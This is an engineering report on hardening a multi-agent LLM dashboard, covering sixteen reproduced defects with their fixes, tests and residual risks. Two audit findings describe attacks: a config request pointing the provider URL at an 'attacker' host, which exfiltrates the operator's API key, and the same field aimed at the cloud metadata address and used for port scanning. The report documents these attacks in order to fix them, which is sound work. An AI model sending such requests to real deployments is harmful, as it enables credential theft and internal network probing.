# Production Hardening: real providers, real browsers, real time

Research → requirements → architecture → implementation → evidence, for the
milestone that came after the security audit.

The audit before this one made the dashboard *safe to run*. This milestone asked a
different question: **does it still work when the traffic is real?** Two assumptions
ran through the whole codebase:

1. answers are small (the simulator produces ~1–2 KB of text), and
2. exactly one browser drives one mesh, one run at a time, and it is always
   listening.

Neither is true the moment you configure a real model and leave a tab open. Every
finding below was reproduced against the code at commit `9cffbd3` before being
fixed, and each fix has a regression test named after it.

---

## 1. Findings (all reproduced, not theorised)

| # | Finding | Reproduced symptom | Severity |
|---|---|---|---|
| **D1** | Provider output is assumed small. `Message.content` is capped at 50 000 chars and `BaseAgent.generate_response` rejects an injected prompt over 10 000 chars | A 10 500-char answer → `HTTP 400 "Prompt too long (max 10000 chars)"`, first turn already written to the transcript; a 51 000-char answer → pydantic `ValidationError`, 0 messages kept, and the model's raw text echoed into the error `detail` and the WS `run_error` broadcast | **High** — a 300-line code answer trips it |
| **D2** | Nothing serialises runs per session | Two concurrent `run_pipeline` calls on one mesh interleave in the shared history (arena, arena, claude, claude, …) and each agent's memory picks up the *other* run's messages, so a live model answers a question contaminated by another run | **High** |
| **D3** | UI fan-out is on the dispatch path | `broadcast_ws` awaits `ws.send_json()` inside the bus's global listener, so one browser tab with a full socket buffer blocks `MessageBus.dispatch` → the run hangs forever (measured: >8 s timeout, never completes) | **High** |
| **D4** | `SessionRegistry.sweep_expired()` was dead code | Idle TTL is only applied when a session happens to make another request; a connected-but-idle tab is never reclaimed, so `--session-ttl` (documented as "Idle sessions are released after --session-ttl minutes") is not enforced | Medium |
| **D5** | `list_sessions` fully parsed every stored transcript | 50 saved sessions × 1.5 MB = **154 ms per `/api/sessions` call**, ~1 s at the 8 MB/file cap, re-read on every panel open | Medium |
| **D6** | `save_session` wrote in place | A crash or `ENOSPC` mid-write leaves a truncated JSON file, which `list_sessions` *skips silently* → "my saved session disappeared" | Medium |
| **D7** | `ProviderError.retryable` was computed and never used | A single transient 429/503/connection blip degrades a whole turn (or 502s the run with `--strict-provider-errors`) | Medium |
| **D8** | The dashboard can be made to send the *operator's* env API key to a *user-supplied* URL | `POST /api/config {"openai_base_url": "http://attacker/v1"}` with **no key** → `OpenAIProvider.__init__` falls back to `os.environ["OPENAI_API_KEY"]`. Captured header on the wire: `Authorization: Bearer sk-OPERATOR-SECRET-…`. Contradicts README ("the dashboard never reads these") and SECURITY.md §3 ("`openai_base_url` is operator-supplied") | **High** on a `--allow-public` bind |
| **D9** | `/api/read/url` is not "the one endpoint that talks to a user-supplied address" (SECURITY.md §4). `/api/config` + `/api/run` also do, unguarded | `openai_base_url` may point at `169.254.169.254`, `100.64.0.0/10`, internal ports; `{"verify": true}` turns it into a clean `GET /models` port-scanner | Medium (public binds only) |
| **D10** | The rate-limit bucket is consumed by *rejected* requests | `state.last_run_time = now` before validation, so a 400 starts a 1 s cooldown on the next legitimate run | Low |
| **D11** | Docs/CLI disagree about the environment | README's env table says `OPENAI_API_KEY` is "Used by `run` mode". It is not: `AgentMesh()` gives every agent a `MockLLMProvider`, verified with the variable set. The CLI even prints "Configure OPENAI_API_KEY … for real answers" | Medium (false claim + missing feature) |
| **D12** | `--no-delay` is ignored by `debate` and `hub`; `examples/*.py` fail `ruff check` and are outside CI's lint scope | `--no-delay` runs at 0.15 s/step anyway; the three examples are unlinted files in a linted repo | Low |

| **D13** | Four prose claims had detached from the code (each verified by grep at `9cffbd3`, not inferred) | README's env table: "`OPENAI_API_KEY` … Used by `run` mode; the dashboard never reads these" - both halves wrong (`run` never read them; the dashboard could, via provider construction). SECURITY §4: "`/api/read/url` is the one endpoint that talks to a user-supplied address" - `/api/config` + `/api/run` also did, unguarded. SECURITY §2 / README: "Idle sessions are released after `--session-ttl` minutes" - nothing released them. README: "`fastapi`/`uvicorn` are only required for the web dashboard" - true of imports, false of installation, since `requirements.txt` *is* the wheel's dependency list | **Medium** - a security document that overstates is worse than one that says nothing |
| **D14** | `save_session`'s size-trim loop cannot terminate | A transcript whose *single* last message exceeds `MAX_SESSION_BYTES` halves a one-element list forever: `[len//2:]` == `[0:]`. Reached in tests with a small cap; in production reachable via a large `agents` blob. The pre-existing code had the same shape | Medium (wedge inside the request thread) |
| **D15** | Session pruning ordered by `mtime` and broke ties with the filename's random suffix | Several saves inside one second (or a filesystem with one-second granularity: FAT, some NFS) can evict **the session you just saved** | Medium (silent data loss, filesystem-dependent) |
| **D16** | `metadata.content_truncated` was written by the agent and rendered by nobody, while `app.js` carried a comment asserting "the badge on the message says it too" | The only visible sign of a clipped answer was inside the Markdown body; the comment was a lie about the UI | Low (documentation-in-code) |

Reproduction scripts were written first, and each one became a test under `tests/`
(the two that were benchmarks became `scripts/bench_sessions.py` and
`scripts/e2e_server_check.py`). The numbers above - lengths, timings, captured
headers - come from running them, not from reading the code and reasoning about it.

## 2. Requirements derived from the findings

Functional
- **F1** A provider answer of any size must complete the run, and truncation must be
  visible in the message (metadata + text notice) — *never* silent, never fatal. (D1)
- **F2** One run at a time per browser session; a second concurrent run is refused
  with an actionable message, and every run event carries an id the UI can attribute. (D2)
- **F3** No UI client can slow or stop a run: fan-out is bounded, non-blocking, and a
  client that cannot keep up loses frames and is told so. (D3)
- **F4** `--session-ttl` must actually reclaim idle sessions and their sockets. (D4)
- **F5** Saving a session is atomic; listing them is O(metadata), not O(transcripts). (D5, D6)
- **F6** Retryable provider failures are retried a bounded number of times with a
  delay, and the transcript says how many attempts were made. (D7)
- **F7** The dashboard never reads an ambient credential. (D8)
- **F8** On a non-loopback bind, a session-supplied provider base URL is validated
  with the same netguard policy the page reader uses; loopback keeps working
  because there the operator *is* the user. (D9)
- **F9** `run` mode gains an explicit, opt-in live path (`--live`) so the documented
  env-key workflow exists; the default stays the simulator. (D11)
- **F10** A documented flag applies to every topology that documents it. (D12)
- **F11** A refused request must not cost the user anything: validation precedes the
  rate-limit stamp, and every refusal says how long to wait. (D10)
- **F12** Anything the client is told about a truncated or shortened transcript is
  visible where the user reads, not only in metadata. (D6, D16)
- **F13** Documents describe the code as it is *today*, including the parts that are
  inconvenient (what is installed, what is enforced, what is not offered). (D13)

Non-functional
- **N1** No new runtime dependency (retry/backoff, queueing, atomic writes are stdlib).
- **N2** Python 3.10 compatibility (`asyncio.wait_for`, not 3.11-only `asyncio.timeout`).
- **N3** Every claim in README/SECURITY that this milestone touched stays true, and
  `tests/test_docs_are_accurate.py` keeps the test counts honest.
- **N4** A run must not be able to hang forever: bounded by `--run-timeout`.
- **N5** Behavioural changes that a user can notice are documented in the same change.

## 3. Architecture decisions

**A. Truncate at the agent boundary, not in the topologies.**
*Alternatives:* raise the 50 000 protocol cap (pushes the problem into the browser and
the saved-session files); make every topology cap its own composed prompt (four places,
easy to miss the fifth). *Chosen:* `BaseAgent` clamps provider output to
`Message.content`'s bound and fits the injected context into a fixed budget, recording
`content_truncated` / `context_truncated` in metadata and prepending a visible notice.
The limit becomes an explicit part of the protocol instead of an implicit assumption,
and all four topologies are fixed by one change. *Trade-off:* a user loses the tail of a
very long answer — mitigated by the notice saying exactly that, and by the cap being
50 KB (≈12 000 words).

**B. Per-session `asyncio.Lock` + 409, rather than a queue.**
*Alternatives:* queue runs (unbounded waiting, a spammer builds a backlog, results
arrive long after the user stopped caring); shard the mesh per run (breaks "agents have
memory" semantics, which is the whole point of the demo). *Chosen:* refuse the second
run while the first holds the lock. *Trade-off:* two tabs of the same profile cannot run
at once — correct, since they also share transcripts and agent memory.

**C. Bounded per-connection outbox instead of awaiting sockets.**
`ClientFeed` gives each WebSocket a queue (128 items) and a pump task; the bus only ever
calls `put_nowait`. On overflow the oldest frame is dropped, a counter is kept, and a
`{"type":"stream_gap","dropped":N}` control frame is queued so the browser re-syncs from
`GET /api/history`. *Alternatives:* `wait_for(send, 1s)` (still serialises, still drops
slow-but-alive clients); drop the message silently (the transcript then lies). *Cost:*
one extra task per connection — closed on disconnect, on eviction, and on sweep.

**D. Keys are never taken from the environment for dashboard-created providers.**
`OpenAIProvider(allow_env_key=…)`, default `True` (library/CLI use), `False` from the
server. *Alternative:* remove env support entirely — that would break the documented
library use case and `examples/`. This is the smallest change that makes D8 impossible
while keeping `OPENAI_API_KEY` useful where the operator is the caller.

**E. The reaper lives in the app's lifespan, not in a request path.**
A single `asyncio.Task` sweeping every `min(60 s, ttl/4)`. *Alternatives:* sweep lazily
(never runs for idle-but-connected clients — the exact bug); a thread (worse: needs
locks around a loop-owned registry).

**F. `--live` as an explicit switch, not auto-detection.**
Auto-upgrading a `run` invocation to a paid API call because `OPENAI_API_KEY` happens to
be exported is the kind of surprise this project's honesty rules forbid.

## 4. Requirement → implementation → evidence

Every evidence cell is a test that was run and passed, not a plan. Counts are the
number of tests in that file (`pytest -q tests/<file>`), all offline.

| Req | Implementation | Evidence |
|---|---|---|
| F1 | `protocol/message.py: clamp_content`, `agents/base.py` clamp + `fit_context` for injected prompts, `server/app.py: _safe_reason` | `tests/test_provider_output_bounds.py` (24) - 1 k…200 k chars across all four topologies, export wording, `/api/run`'s `truncated_messages`, and `_safe_reason` refusing to echo a payload |
| F2 | `server/state.py: run_lock` + `active_run_id`, `server/app.py` 409-with-reason, `run_id` on `run_started`/`new_message`/`run_completed` | `tests/test_run_serialization.py` (7) - loser gets 409, transcript untouched, `run_id` consistent across frames, lock freed on error |
| F3 | `server/feed.py: ClientFeed` (bounded outbox, drop-oldest, `stream_gap`, send timeout), `SessionState.publish`, `finally:` detach in the WS handler | `tests/test_ws_backpressure.py` (7) - a stalled socket cannot delay the producer, 40 publishes → `dropped >= 30` with the newest frames intact, `/api/run` completes on a saturated feed |
| F4 | `server/app.py` lifespan sweeper → `SessionRegistry.sweep_expired(reason)`, `on_evict` → `close_feeds(final=…, code=4408)`, `session_released` frame | `tests/test_session_lifecycle.py` (11) - a quiet tab with a live socket is reclaimed with no further request, its next request is a *new* session, capacity eviction prefers ephemeral, sweeper stops with the app |
| F5 | `sessions.py: _write_atomic`, metadata header (`message_count`, `trimmed`), prefix-only listing, stale-`.tmp` prune, `new_session_id` carries sub-second precision | `tests/test_session_storage.py` (15) - a failed `os.replace` leaves the previous file byte-identical with no temp litter, listing reads ≤ 4 KiB per file, oversized transcripts are trimmed *and flagged*, prune order is timestamp-driven |
| F6 | `providers.py: post_for_json` retry loop, `max_attempts`/`retry_backoff`/`timeout`, `_backoff_sleep` seam, `ProviderError.attempts`, `metadata.provider_attempts` | `tests/test_provider_retry.py` (11) - 429/503 retried up to the budget, 401 not retried, an unparseable 200 costs one request, the wait scales with the attempt, and the transcript records the effort |
| F7 | `providers.py: allow_env_key`, `server/app.py` builds providers with `allow_env_key=False`, auth headers only when a key exists | `tests/test_env_key_isolation.py` (7) - a real aiohttp capture server asserts the headers it *received*: a keyless session sends none, an operator key is never attached to a session's request, and clearing a key cannot resurrect it from the environment |
| F8 | `netguard.validate_provider_target`, `server/app.py: _guard_provider_url`, `--allow-insecure-provider-urls`, `ServerConfig.allow_insecure_provider_urls` | `tests/test_provider_url_policy.py` (27) - CGNAT/`192.0.0.1`/IPv6-mapped/decimal-host matrices, loopback bind keeps Ollama on any port, public bind refuses and changes nothing (mode stays `simulated`), operator allowlist honoured |
| F9 | `cli.py: run --live {openai,anthropic,both}`, `--base-url`, `--provider-timeout`, honest pre-flight banner, exit 1 without a key | `tests/test_cli_live.py` (33) - which agents get wired per mode, nothing dials out without `--live`, the key is never echoed, flag > env > default for `--run-timeout`/`--max-sessions`/`--session-ttl`, and `SESSION_TTL=5m` stops startup instead of being ignored |
| F10 | `cli.py`/`mesh.py: _delay_kwargs` on all four topologies | `tests/test_cli_live.py` (parametrised over p2p/pipeline/debate/hub) + measured 0.45 s → 0.00 s |
| F11 | validation before the cooldown stamp, `Retry-After` on 409/429 | `tests/test_run_serialization.py` - `state.last_run_time` unchanged by a 400 |
| F12 | `server/app.py: _safe_reason` for every failure string that reaches a client | `tests/test_provider_output_bounds.py` (unit cases) |
| N1/N2 | stdlib-only core, `asyncio.wait_for` on every await that can block | CI matrix (3.10/3.11/3.12) + `test_import_without_optional_deps` |
| N3 | README + SECURITY.md rewritten in the same change; `serve` knobs readable from the environment | `tests/test_docs_are_accurate.py` (8) + `tests/test_cli_live.py` |
| N4 | `--run-timeout` (default 180 s) → 504 with a plain-language reason, `run_error` frame first | `tests/test_run_serialization.py` |
| D16 | `.prov-clipped` badge in `app.js` + `style.css` | `tests/js/client-lifecycle.test.mjs` (8) |

---

## 5. Testing: what was run, and what it caught

Three layers, deliberately: unit (pure functions), in-process HTTP (`httpx.ASGITransport`
/ `TestClient`), and a **real uvicorn process driven over real HTTP and a real
WebSocket** (`scripts/e2e_server_check.py`, 33 checks, two browser sessions, run by CI
against the installed wheel). Plus jsdom for the client's own behaviour, since the
server-side tests cannot prove a browser does anything with the frames it is sent.

| Result | |
|---|---|
| `pytest -q` | **365 passed** (was 220 at `9cffbd3`), 0 failures, 2 warnings (both starlette/httpx deprecations) |
| `node --test "tests/js/*.test.mjs"` | **23 pass** (15 sanitizer + 8 client lifecycle) |
| `ruff check machinelearningmachine tests scripts examples` | clean (examples were broken at baseline and are now in CI's scope) |
| `scripts/e2e_server_check.py` | **33/33 PASS** against a live server |
| `python scripts/bench_sessions.py` | 50 transcripts, 73.9 MB: `list_sessions` **1.3 ms** vs **213.4 ms** for read+parse-every-file (167×); the script exits non-zero if the header index ever stops paying for itself |
| packaged wheel | built, installed into a clean venv, served, and the e2e pass run against it (the new CI step) |

Defects found *by* these tests while they were being written - i.e. the tests earned
their place, they did not merely decorate the change:

1. **The eviction path never closed sockets.** `SessionState.close_feeds` was declared
   `*, reason=` while the `on_evict` hook called it with `final=`; the `TypeError` was
   swallowed by the `try/except` in `_dispose`, which only logged. `test_session_lifecycle.py`
   is the only thing that would ever have noticed, because the failure mode was
   "socket stays open" - invisible to every other test. (This was a regression
   introduced during this milestone, caught before commit.)
2. **`save_session` could not terminate** (D14). `test_a_single_huge_message_does_not_loop_forever`
   hung the suite for the full 300 s timeout; the halving loop makes no progress on a
   one-element list, and the pre-existing code had the same shape.
3. **Pruning could delete the newest session** (D15), exposed by
   `test_max_sessions_bound_is_enforced_on_save` - nine saves inside one second, five
   survivors, and the missing ones were not the oldest.
4. **`float(flag or default)` turned `--provider-timeout 0` into 60**, i.e. the value
   the user typed was silently replaced by the default - caught by the parametrised
   rejection test I wrote *for* that flag.
5. **"2 replys were longer than…"** - the pluralisation in the truncation toast, caught
   by a jsdom assertion on user-visible text.
6. **A test harness that double-initialised the client.** Manually dispatching
   `DOMContentLoaded` after `win.eval(app.js)` made jsdom's own event fire a second
   init: two sockets, two toasts, and assertions that would have passed for the wrong
   reason. Fixed by installing the client in `beforeParse` - and the test now asserts
   exactly one socket, so the harness itself is covered.

Two things worth flagging about this milestone's own work, because the point of the
exercise was not to add unfounded claims:

- The CI step added here originally ran `pip install "$wheel[web]"`. pip answered
  *"does not provide the extra 'web'"* - `pyproject.toml` has only `dev`, and
  `requirements.txt` *is* the wheel's dependency list, so fastapi/uvicorn are installed
  unconditionally. Caught by executing the step locally before committing it, which is
  now the standing rule for anything added to CI here. The repo's own
  `_deps.install_hint` was checked and is accurate (`pip install -e .` or
  `-r requirements.txt`); the README sentence about "only required for the web
  dashboard" was reworded to state the install-time truth as well.
- `app.js` carried a comment claiming a truncation badge existed when none was rendered
  (D16). The badge was added rather than the comment deleted, and a jsdom test now
  asserts it - a comment about the UI is a claim about the UI.

---

## 6. Residual risks and limits of what was proven

- **DNS rebinding is documented, not closed.** `validate_provider_target` checks
  addresses, then `aiohttp` resolves again. Same pre-existing gap as the page reader.
- **Backpressure is bounded, not prevented.** A tab that cannot keep up loses frames and
  refetches `/api/history`; if the bus buffer has already rolled past them, the transcript
  on screen is complete *as far as the server still holds it*.
- **The run lock is per-process.** With `--workers > 1` (never the default, and not
  supported by this design) the lock, the registry and the outboxes are per worker;
  nothing here pretends otherwise.
- **Retry accounting is honest but not adaptive.** `max_attempts` is a total budget, not
  a rate-limit-aware policy; no `Retry-After` from the upstream is honoured.
- **Simulator-mode tests cannot exercise real provider quirks** (streamed partials,
  chunked encoding, 401 mid-conversation). The retry/timeout/attempt paths are tested
  against scripted HTTP doubles, which is what a hermetic suite can honestly do.
- **The jsdom client tests stub `fetch` and `WebSocket`.** They prove the client reacts
  correctly to frames; the real socket is covered by the e2e script, and browser-specific
  rendering (canvas, Web Speech) is not asserted anywhere.

## 7. What this milestone deliberately did *not* do

- **Mid-run cancellation.** A run is bounded by `--run-timeout` instead. A real
  Stop button needs the topologies to check a cancellation flag between turns; with a
  lock and a timeout in place the worst case is now bounded and visible.
- **Multiple runs per session.** Deliberately refused (decision B).
- **Per-run meshes or a job queue.** Correct for a multi-user service; this is a local
  tool with one shared token, and a queue would need persistence to be honest about it.
- **Pinning provider connections to the IPs validated at check time.** Same residual
  DNS-rebinding risk netguard already documents; the policy now applies to provider
  URLs, but the transport is still `requests`/`aiohttp`.
- **TLS, per-user authorisation, multi-worker scaling.** Unchanged; see SECURITY.md.

---

## 8. Traceability: finding → requirement → code → test

| Finding | Requirement | Code | Test |
|---|---|---|---|
| D1 output bounds | F1 | `protocol/message.py`, `agents/base.py`, `server/app.py:_safe_reason` | `test_provider_output_bounds.py` (24) |
| D2 concurrent runs | F2 | `server/state.py:run_lock`, `server/app.py:/api/run` | `test_run_serialization.py` (7), e2e check "concurrency in the same tab" |
| D3 fan-out on dispatch path | F3 | `server/feed.py`, `server/state.py:publish`, WS handler `finally` | `test_ws_backpressure.py` (7), e2e "no frame was dropped on a healthy connection" |
| D4 dead sweeper | F4 | `server/app.py` lifespan task, `state.sweep_expired`, `close_feeds` | `test_session_lifecycle.py` (11) |
| D5 listing parsed everything | F5 | `sessions.py:_head_meta`, stored `message_count` | `test_session_storage.py` (15) + `scripts/bench_sessions.py` (1.3 ms vs 213 ms) |
| D6 non-atomic save | F5, F12 | `sessions.py:_write_atomic`, temp-file prune | `test_session_storage.py` (failed-write and stale-temp cases), `test_sessions.py` (endpoint surfaces the reason) |
| D7 retryable never used | F6 | `agents/providers.py:post_for_json`, `_backoff_sleep` | `test_provider_retry.py` (11) |
| D8 ambient key on the wire | F7 | `providers.py:allow_env_key`, `server/app.py` provider construction, header suppression | `test_env_key_isolation.py` (7) - a capture server asserts the headers it actually received |
| D9 unguarded provider URL | F8 | `netguard.validate_provider_target`, `server/app.py:_guard_provider_url`, `--allow-insecure-provider-urls` | `test_provider_url_policy.py` (27) |
| D10 cooldown spent by 400 | F11 | `server/app.py` ordering + `Retry-After` | `test_run_serialization.py` (2 cases) |
| D11 `run --live` missing | F9 | `cli.py:_apply_live_providers`, banner, exit 1 | `test_cli_live.py` (33) |
| D12 `--no-delay`, unlinted examples | F10 | `mesh.py:_delay_kwargs`, `cli.py`, CI lint scope | `test_cli_live.py` (parametrised), `ruff check examples` in CI |
| D13 four stale prose claims | F13, N3 | README/SECURITY/USER_CENTERED_DESIGN rewritten in this change | `test_docs_are_accurate.py` (8) |
| D14 trim loop could not terminate | F5 | `sessions.py` bounded loop + explicit refusal | `test_session_storage.py::test_a_single_huge_message_does_not_loop_forever` |
| D15 prune order tie | F5 | `sessions.py:_prune_sort_key`, sub-second `new_session_id` | `test_session_storage.py` (2 prune cases) |
| D16 badge claimed but absent | F12, F1 | `static/app.js`, `static/style.css` | `tests/js/client-lifecycle.test.mjs` ("clamped reply is badged") |

Requirements **N1/N2/N4** (no new runtime dependency; every await bounded; runs bounded by
`--run-timeout`) are cross-cutting: they are the reason the fixes above are implemented as
a bounded per-connection outbox and an `asyncio.wait_for` rather than a queue, a worker
pool, or a new dependency.

---

## 9. Validation status

**Done and verified locally, at the commit this milestone produced:**

- `pytest -q` → 365 passed; `node --test "tests/js/*.test.mjs"` → 23 passed;
  `ruff check machinelearningmachine tests scripts examples` → clean.
- The packaged wheel installs into a clean venv, serves, and passes the 33-check
  end-to-end script (this is now a CI step, so the claim is re-checked on every push).
- Every finding D1-D16 has a named regression test; every README/SECURITY claim touched
  here is either enforced by `test_docs_are_accurate.py` or restated as a limitation.

**Not done, stated plainly:**

- No real OpenAI/Anthropic call was made during this milestone - there is no key in the
  test environment and none was used. Provider behaviour (retries, timeouts, attempt
  accounting, header suppression) is proven against scripted HTTP servers, not vendors.
- No load/perf suite beyond the two measured numbers (the saved-session listing and
  `--no-delay`). `scripts/bench_sessions.py` reproduces the first on any machine - 50
  files, ~1.5 MB each - but a ratio like 167x moves with the filesystem and the page
  cache, so it is a regression tripwire (it exits non-zero if the header index stops
  paying for itself), not a published benchmark.
- No cross-browser verification: the client behaviours are jsdom + code review, not
  Safari/Firefox runs.
- The GitHub Actions workflow changes are unexecuted here (this environment has no
  runner); the steps were reproduced by hand locally, which is how the `[web]`-extra
  mistake was caught before commit.
